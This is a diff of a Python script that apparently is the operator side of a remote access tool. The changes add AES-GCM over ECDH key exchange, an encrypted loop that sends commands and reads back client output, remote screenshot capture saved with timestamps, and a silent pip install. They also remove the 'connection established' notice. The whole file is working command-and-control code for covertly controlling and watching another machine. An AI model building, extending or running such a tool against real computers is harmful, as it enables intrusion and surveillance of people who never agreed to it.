@@ -1,27 +1,58 @@
 #!/usr/bin/env python3
 
-import socket
-import argparse
-import os
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding, hashes, serialization
+import socket, argparse, os, readline
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.backends import default_backend
+import datetime, subprocess
 
-def aes_encrypt(data, key, iv):
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-    encryptor = cipher.encryptor()
-    padder = padding.PKCS7(128).padder()
-    padded_data = padder.update(data) + padder.finalize()
-    return encryptor.update(padded_data) + encryptor.finalize()
+try:
+    import readline
+except ImportError:
+    try:
+        import pyreadline as readline
+    except ImportError:
+        subprocess.run(["pip", "install", "pyreadline"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        import pyreadline as readline
 
-def aes_decrypt(data, key, iv):
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-    decryptor = cipher.decryptor()
-    unpadder = padding.PKCS7(128).unpadder()
-    decrypted_data = decryptor.update(data) + decryptor.finalize()
-    return unpadder.update(decrypted_data) + unpadder.finalize()
+def aes_encrypt(data, key):
+    aesgcm = AESGCM(key)
+    nonce = os.urandom(12)
+    ciphertext = aesgcm.encrypt(nonce, data, None)
+    return nonce + ciphertext
+
+def aes_decrypt(encrypted_data, key):
+    aesgcm = AESGCM(key)
+    nonce = encrypted_data[:12]
+    ciphertext = encrypted_data[12:]
+    return aesgcm.decrypt(nonce, ciphertext, None)
+
+def receive_full_data(socket, buffer_size=4096):
+    data = b""
+    while True:
+        part = socket.recv(buffer_size)
+        data += part
+        if len(part) < buffer_size:
+            break
+    return data
+
+def receive_with_size(socket):
+    size_data = socket.recv(4)
+    if not size_data:
+        return b""
+    size = int.from_bytes(size_data, byteorder='big')
+    data = b""
+    while len(data) < size:
+        part = socket.recv(size - len(data))
+        if not part:
+            break
+        data += part
+    return data
+
+def clear_screen():
+    print("\033c", end="")
 
 def start_server(ip, port):
     server_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
@@ -32,7 +63,6 @@ def start_server(ip, port):
     server.listen(1)
     print(f"[*] Listening on {ip}:{port}")
     client_socket, client_address = server.accept()
-    print(f"[*] Connection established with {client_address}")
 
     try:
         client_socket.send(server_public_key.public_bytes(
@@ -49,33 +79,60 @@ def start_server(ip, port):
         shared_key = server_private_key.exchange(ec.ECDH(), client_public_key)
         derived_key = HKDF(
             algorithm=hashes.SHA256(),
-            length=48,
+            length=32,
             salt=None,
             info=b'handshake data',
             backend=default_backend()
         ).derive(shared_key)
 
-        key = derived_key[:32]
-        iv = derived_key[32:48]
+        key = derived_key
 
-        while True:
+    except (ConnectionResetError, ValueError, Exception) as e:
+        print(f"\n[!] Handshake failed: {str(e)}")
+        client_socket.close()
+        return
+
+    while True:
+        try:
             command = input("\n[Server] Enter command: ").strip()
+            
+            if command == '\x0c':
+                clear_screen()
+                continue
+            
             if command.lower() == "exit":
-                encrypted_command = aes_encrypt(command.encode('utf-8'), key, iv)
+                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                 client_socket.send(encrypted_command)
                 client_socket.close()
-                print("[*] Connection closed.")
                 break
-            encrypted_command = aes_encrypt(command.encode('utf-8'), key, iv)
-            client_socket.send(encrypted_command)
-            encrypted_response = client_socket.recv(4096)
-            if not encrypted_response:
-                break
-            response = aes_decrypt(encrypted_response, key, iv).decode('utf-8')
-            print(f"\n[Client]: {response}")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        client_socket.close()
+            elif command == "screenshot":
+                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
+                client_socket.send(encrypted_command)
+                screenshot_counter = 1
+                while True:
+                    encrypted_screenshot = receive_with_size(client_socket)
+                    if not encrypted_screenshot:
+                        break
+                    screenshot_data = aes_decrypt(encrypted_screenshot, key)
+                    timestamp = datetime.datetime.now().strftime("%d%m%Y_%H%M%S")
+                    filename = f"screenshot_{timestamp}_{screenshot_counter}.png"
+                    with open(filename, "wb") as screenshot_file:
+                        screenshot_file.write(screenshot_data)
+                    print(f"Screenshot saved as '{filename}'")
+                    screenshot_counter += 1
+            else:
+                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
+                client_socket.send(encrypted_command)
+                encrypted_response = receive_with_size(client_socket)
+                if not encrypted_response:
+                    break
+                response = aes_decrypt(encrypted_response, key).decode('utf-8')
+                print(f"\n[Client]: {response}")
+        except KeyboardInterrupt:
+            print("\n[!] Use 'exit' to close the connection, CTRL+C ignored.")
+            continue
+        except Exception as e:
+            client_socket.close()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
